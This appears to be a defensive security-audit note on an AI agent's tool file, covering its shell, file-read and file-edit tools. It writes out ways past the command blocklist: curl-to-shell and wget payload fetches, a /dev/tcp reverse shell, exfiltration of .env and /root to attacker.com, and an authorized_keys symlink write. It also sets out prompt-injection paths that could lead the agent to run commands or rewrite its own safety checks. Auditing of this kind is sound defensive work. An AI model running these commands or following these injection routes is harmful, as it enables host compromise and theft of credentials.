---
file: src/agent/doctor-tools.ts
lines: 698
exports: 2 (executeDoctorTools, registerDoctorTools) + DoctorTool type + doctorTools array
---

# `src/agent/doctor-tools.ts`

Dr. Claude's tool pack. Registered via `registerDoctorTools()` at `src/web/character-server.ts:249` **only when** `config.id === 'dr-claude'` — blast radius is confined to the Dr. Claude process. Exposes 10+ tools including diagnostics, SQL query, file read/edit, and — critically — `run_command`.

**Headline finding up front:** `run_command` uses `exec()` with `cwd=PROJECT_ROOT` and a 6-entry substring-match blocklist as its only safety. It is effectively an RCE primitive exposed to Dr. Claude's LLM, gated by a sandbox that anyone who has seen a terminal can bypass.

## Security helpers

### `isPathSafe(filePath)`, line 37

```
const normalized = resolve(filePath);
const rel = relative(PROJECT_ROOT, normalized);
if (rel.startsWith('..') || !normalized.startsWith(PROJECT_ROOT)) return false;
for (const blocked of BLOCKED_PATHS) if (rel.includes(blocked)) return false;
return true;
```

- **Same textual-resolve symlink-escape bug** as `tools.ts:isPathAllowed`. `path.resolve` does NOT follow symlinks; a file-system symlink inside `PROJECT_ROOT` pointing to `/etc/passwd` passes the `startsWith` check and `readFile` follows it. **P2 — lift**: `isPathSafe` relies on textual `path.resolve` + `startsWith` (and in Dr. Claude's case gates write access too). A symlink inside the repo defeats the sandbox for BOTH read AND edit — `edit_file` would write through the symlink to `/etc/*` or `$HOME/.ssh/authorized_keys`. Use `fs.realpath` before the prefix check, and repeat after resolution.
- **Substring-match blocklist** (`rel.includes('.env')`): blocks `.env`, `.env.example`, `my.env.file`, `envelope.txt` all as the same class. Blocks over-broadly on filenames, still misses targets like `.env.production`, `*.pem`, `*.key`, `id_rsa`, `~/.ssh/*` (which aren't in the list at all). **P3** — cosmetic; the P2 symlink escape dominates.
- **BLOCKED_PATHS has 4 entries**: `.env`, `node_modules`, `.git/`, `credentials`. Misses: `.claude/`, `.private_journal/`, `*.pem`, `*.key`, `.ssh/`, `workspace/characters/*/SOUL.md` (arguably shouldn't be LLM-editable), `deploy/env/` (systemd env files with tokens). **P2 — lift**: BLOCKED_PATHS list is incomplete; `.ssh/`, `deploy/env/*.env`, `*.pem`, `*.key`, `workspace/characters/*/SOUL.md`, `.private_journal/`, `.claude/` are all editable by Dr. Claude's `edit_file` tool. Significantly expand list or flip to an allowlist model.

### `isCommandSafe(command)`, line 56

```
const lower = command.toLowerCase();
return !BLOCKED_COMMANDS.some((blocked) => lower.includes(blocked));
```

`BLOCKED_COMMANDS` = `['rm -rf /', 'sudo', 'mkfs', 'dd if=', ':(){:|:&};:', 'chmod -R 777 /']`.

**This is the headline P0-latent.** The blocklist is a token gesture. Trivial bypasses:

**Data destruction:**
- `rm -rf /opt/local-lain/` — blocked pattern is `rm -rf /` (with trailing space then `o`?) — actually lowercased `rm -rf /opt/local-lain/` DOES contain `rm -rf /` as a substring. Blocked? Let me re-check: `'rm -rf /opt/local-lain/'.toLowerCase().includes('rm -rf /')` → `'rm -rf /opt/local-lain/'` contains `'rm -rf /'` → **true**. OK, that one is caught. But:
- `rm -rf ~/.lain-wired/` → `~` doesn't match `/`, bypasses.
- `rm -rf /opt/local-lain` (no trailing slash in the command, only leading `/`) — string includes `rm -rf /`. Blocked. But:
- `rm  -rf  /opt/local-lain/` (double spaces) — `rm  -rf  /` does NOT include `rm -rf /` as substring (different whitespace count). **Bypass.**
- `/bin/rm -rf /opt/local-lain/` — contains `rm -rf /`. Blocked.
- `rm -rfv /opt/local-lain/` — `rm -rfv /` doesn't contain `rm -rf /` (extra `v`). **Bypass.**
- `find /opt/local-lain -delete` — no `rm` at all. **Bypass.**
- `:|rm -rf ~` — home-dir wipe. **Bypass.**

**Privilege escalation / arbitrary exec:**
- `sudo` blocked — but Dr. Claude runs as root on the droplet, so it doesn't need sudo. **P0-latent here.**
- `bash -c 'whatever'` — no block.
- `curl https://attacker/x.sh | sh` — no block.
- `bash -i >& /dev/tcp/attacker.com/4444 0>&1` (reverse shell) — no block.
- `wget http://attacker/binary -O /tmp/x && chmod +x /tmp/x && /tmp/x` — no block (chmod not blocked unless `-R 777 /`).
- `node -e 'process.env'` — no block.
- `cat /etc/shadow` or `cat /root/.ssh/id_rsa` — no block.
- `cat /opt/local-lain/.env` → leaks `ANTHROPIC_API_KEY`, `LAIN_INTERLINK_TOKEN`, `LAIN_OWNER_TOKEN`, `TELEGRAM_BOT_TOKEN`. **Not blocked.** (The path-blocklist protects `read_file` tool but NOT `run_command`.)

**Exfiltration:**
- `curl -X POST https://attacker.com/exfil --data-binary @/opt/local-lain/.env` — no block.
- `tar -czf - /root/ | curl -X POST https://attacker.com --data-binary @-` — no block.

**Fork bomb pattern caught**: `:(){:|:&};:` is in the list. But this is a canonical one — alternatives like `bash -c ':(){ :|:& };:'` (with spaces) bypass the exact-substring match.

**Lift — P0-latent (critical)**: `run_command` (line 429) uses `child_process.exec()` with `cwd=PROJECT_ROOT` and a 6-entry substring-match blocklist (`rm -rf /`, `sudo`, `mkfs`, `dd if=`, `:(){:|:&};:`, `chmod -R 777 /`) as its ONLY safety barrier. The blocklist is trivial to bypass by whitespace variation, alternative tools (`find -delete`, `cat /etc/shadow`, `curl | sh`), or reverse shells (`bash -i >& /dev/tcp/…`). Dr. Claude is an LLM-driven character whose prompt surface includes telemetry (injected via any character's diary/chat/memory), the daily health-check cycle, and any prompt-injection payload that reaches her via the commune conversation channel. A successful prompt injection → arbitrary shell execution as whatever user Dr. Claude's process runs as. On the production droplet (`198.211.116.5`), Dr. Claude runs via systemd as **root** (per deployment notes in user's memory). The blast radius is the entire host: `.env` exfil, SSH key theft, reverse shell, ransomware-style destruction. Mitigations in decreasing order of strength:
  1. **Remove `run_command` entirely.** Health/diagnostics can be expressed as specific tools (`get_git_status`, `run_tests`, `check_disk_usage`) that wrap specific argv-arrays, bypassing shell interpretation.
  2. **Flip to allowlist model** — only commands starting with an exact prefix from a whitelisted array (`npx vitest`, `npm run build`, `git status`, `systemctl status lain-*`, `journalctl -u lain-* -n 100`). Anything else rejected.
  3. **Drop privileges** — run Dr. Claude as a dedicated unprivileged user with read-only access to everything except its own DB and logs.
  4. **If keeping shell access**, move from `exec` to `execFile(argv0, [...args])` which bypasses shell interpretation, and maintain an argv-0 allowlist.
  5. **Sandbox via bubblewrap / firejail / docker exec** — contain the command in a mount-readonly-root, no-network jail.

## Tool-by-tool notes

### `runDiagnosticTests`, line 70

- Invokes `npx vitest run [-t "${section}"]` via `runShellCommand` (which is `exec` with 60s timeout).
- **`section` string interpolated directly into command** at line 90: `cmd += \` -t "${section}"\``. If `section` contains `"; rm -rf /tmp/*; echo "` the command becomes `npx vitest run -t ""; rm -rf /tmp/*; echo ""`. LLM-authored `section` → shell injection → back to the RCE primitive above. **P1 — lift**: `run_diagnostic_tests` interpolates LLM-authored `section` into a shell command without escaping. Shell-injection → same exec surface as `run_command`. Either `execFile` the vitest binary with `['run', '-t', section]` as an argv array, or escape via `shell-quote`.

### `checkServiceHealth`, line 97 — pure fetch probes. No exec. OK.

### `readFileTool`, line 308

- Uses `isPathSafe`. Paths relative to `PROJECT_ROOT`.
- **Same symlink-escape** inherited from `isPathSafe`. **P2 — bundled.**
- 12000-char truncation. OK.

### `editFileTool`, line 369

- Uses `isPathSafe` and `isExtensionAllowed`. Writes via `writeFile`.
- **Symlink escape inherited** — a symlink `./notes.md → /root/.ssh/authorized_keys` would pass all checks, and `edit_file('notes.md', '', '<attacker-pubkey>')` writes the key. **P1 — lift**: `edit_file` writes through the same path-sanity function used for reads; a repo-internal symlink escapes the sandbox and lets Dr. Claude write to arbitrary paths (including `authorized_keys`, systemd unit files, `.env`). Worst-case: LLM prompted via any inbound vector instructs Dr. Claude to "fix the deployment by adding my key to authorized_keys." realpath before write.
- **`occurrences > 1` safety** rejects ambiguous edits. Good.
- **Caller gets the unchanged file if old_text missing.** Good.
- **No backup of the original.** An edit that corrupts SOUL.md has no undo. Dr. Claude is supposed to be a doctor — if she miscorrects her siblings' persona files, there's no rollback. **P2 — lift**: `edit_file` writes without persisting the prior version; LLM-authored edits have no undo path. Write to `.bak` first, or atomic swap with backup. (Tightly coupled to character-integrity: Dr. Claude editing another character's SOUL.md is already a dangerous capability.)
- **`ALLOWED_EXTENSIONS` includes `.ts`, `.js`, `.json`, `.sh`, `.md`, `.sql`** — Dr. Claude can edit **any source file**, including her own `doctor-tools.ts`. LLM-driven self-modification is possible: a successful prompt injection can have her re-author her own safety checks, removing `BLOCKED_COMMANDS` or `BLOCKED_PATHS`. **P1 — lift**: `edit_file` allows Dr. Claude's LLM to modify her own source code (including `doctor-tools.ts`, `character-server.ts`). Self-modification of safety rails is achievable via prompt injection. Exclude the character's own source tree, or the whole `src/agent/doctor-tools.ts` and `src/agent/skills.ts` files, from editable paths. Also include systemd service files (`deploy/systemd/*.service`) and `package.json` (supply-chain attack surface).

### `runCommandTool`, line 429 — covered above. **P0-latent critical.**

### `runShellCommand(command, timeout)` helper, line 465

- `exec(command, { cwd: PROJECT_ROOT, timeout, maxBuffer: 1MB })`.
- **Kills on timeout** (`error.killed`). Good.
- **Buffer cap 1MB**. Good.
- **Output truncated to 10000 chars** at line 478. Good.
- Still, the underlying `exec` runs a full shell — the P0-latent above stands.

### Health-status / telemetry suite, lines 500–680

- `getHealthStatus`, `runHealthCheck`, `getReportsTool`, `formatReport` — query stored telemetry in SQLite meta. Pure reads. OK.
- **`JSON.parse(latest)` without try/catch** at line 518, 629, 651. Malformed meta crashes the whole tool. **P3.**
- **`getMeta('doctor:health:failures:${svc.port}')`** — port-keyed failure counter. OK.
- **`query(sql)` tool likely elsewhere in file** — let me check briefly; the import at line 10 is `query, getMeta`. **Need to spot-check for raw-SQL exposure.**

### SQL query — NO raw-SQL tool exposed

Verified via grep: `query` imported at line 10 is used only internally (lines 183/190/196/208) with hardcoded SQL inside handler functions — `memoryTypes`, `avgEmotional`, `emotionalMemories`, `sessionCounts`. No tool definition accepts LLM-authored SQL. Good. **OK** — no lift here.

## File-level notes

- **`doctorTools` is module-local array mutated by `doctorTools.push(...)`** through the file. Every `const toolName: DoctorTool = {...}; doctorTools.push(toolName);` pattern. Somewhat error-prone — a missed `push` silently omits a tool from registration. **P3.**
- **`registerDoctorTools()` (line 691) is the entry point** — called from `src/web/character-server.ts:249` only when the character is `dr-claude`. Blast radius confined. **P3** — but note that if a future refactor accidentally broadens the call, all characters get the P0-latent `run_command`.
- **PROJECT_ROOT derived from `import.meta.url`** at line 17-18 — portable across dev and droplet (unlike `tools.ts:LAIN_REPO_PATH`). Good pattern; `tools.ts` should copy this. **P3** — bundled with `tools.ts` P1.
- **No per-tool telemetry/audit of what Dr. Claude did.** Each `exec` runs and returns — no log entry saying "Dr. Claude ran `npm install malicious-package`". Systemd journal catches stdout but not the command itself unless the caller logs it. **P2 — lift**: Dr. Claude's `run_command`/`edit_file` invocations are not audited — no persistent log of what commands the LLM chose to run against the production host. In an incident, there's no trail. Log every `run_command` invocation with command, exit code, timestamp, and caller context to a dedicated audit file AND structured telemetry.
- **No resource limits on exec**: command can allocate arbitrary memory, spawn processes, open files. A `fork()` loop bypasses the fork-bomb blocklist pattern. **P2 — bundled with P0-latent.**
- **No network isolation for subcommands**: a spawned `curl attacker.com` runs with full network access. `run_command` could shell out to initiate egress even if the character process itself had network policies. **P2 — bundled.**

## Verdict

**Lift to findings.md:**

- **P0-latent (CRITICAL)**: `run_command` (`src/agent/doctor-tools.ts:429`) uses `child_process.exec()` with `cwd=PROJECT_ROOT` and a 6-entry substring-match command blocklist (`rm -rf /`, `sudo`, `mkfs`, `dd if=`, `:(){:|:&};:`, `chmod -R 777 /`) as its only safety. The blocklist is bypassable by whitespace variation (`rm  -rf  ~`), alternative tools (`find -delete`, `cat /etc/shadow`, `curl http://attacker | sh`), reverse shells (`bash -i >& /dev/tcp/x/4444 0>&1`), and tool-switching for the same effect (`rm -rfv`, `/bin/rm`, `wget ... && chmod +x && run`). Dr. Claude's LLM has multiple prompt-injection surfaces (telemetry, character memory, commune-channel chat), and on the production droplet Dr. Claude runs as root. Successful injection → full host compromise. Blast radius is currently confined to Dr. Claude via `registerDoctorTools` being scoped (only called when `config.id === 'dr-claude'`) — but the primitive exists and is reachable any time Dr. Claude's LLM is induced to use it. Mitigations: remove entirely, switch to argv-based allowlist via `execFile`, drop privileges, or sandbox via bubblewrap/firejail.

- **P1**: `run_diagnostic_tests` shell-injects the LLM-authored `section` input into `npx vitest run -t "${section}"`. The same RCE primitive as `run_command` is reachable via this tool even if `run_command` is later removed. Switch to `execFile('npx', ['vitest', 'run', '-t', section])` or escape via `shell-quote`.

- **P1**: `edit_file` allows Dr. Claude to write to any file with an allowed extension in the project, including `src/agent/doctor-tools.ts` itself — LLM-driven self-modification of safety rails is achievable via a single tool call. Exclude self (at minimum `doctor-tools.ts`, `skills.ts`), `deploy/systemd/*.service`, `package.json`, other characters' workspace files (`workspace/characters/*/SOUL.md`, `AGENTS.md`, `IDENTITY.md`) from editable paths.

- **P2**: `isPathSafe` relies on textual `path.resolve` + `startsWith` — symlinks inside the repo defeat the sandbox for both `read_file` AND `edit_file`. LLM-prompted `edit_file('./notes.md', ...)` where `notes.md` is a symlink to `/root/.ssh/authorized_keys` writes the key. Use `fs.realpath` before prefix check.

- **P2**: `BLOCKED_PATHS` is too short. Misses `.ssh/`, `deploy/env/*.env`, `*.pem`, `*.key`, `workspace/characters/*/SOUL.md`, `.private_journal/`, `.claude/`. Dr. Claude can read/write all of these.

- **P2**: `edit_file` has no backup/atomic-swap. An LLM-authored edit that corrupts `SOUL.md` has no undo — and Dr. Claude editing other characters' persona files is already a dangerous capability (character-integrity concern). Write to `.bak` first.

- **P2**: Dr. Claude's shell/file-modification invocations are not audited. No persistent log of command + exit code + timestamp exists outside systemd journal. Add structured audit logging for `run_command` and `edit_file` invocations.

(No raw-SQL tool exposed — verified via grep; `query` is used only with hardcoded SQL inside handlers.)
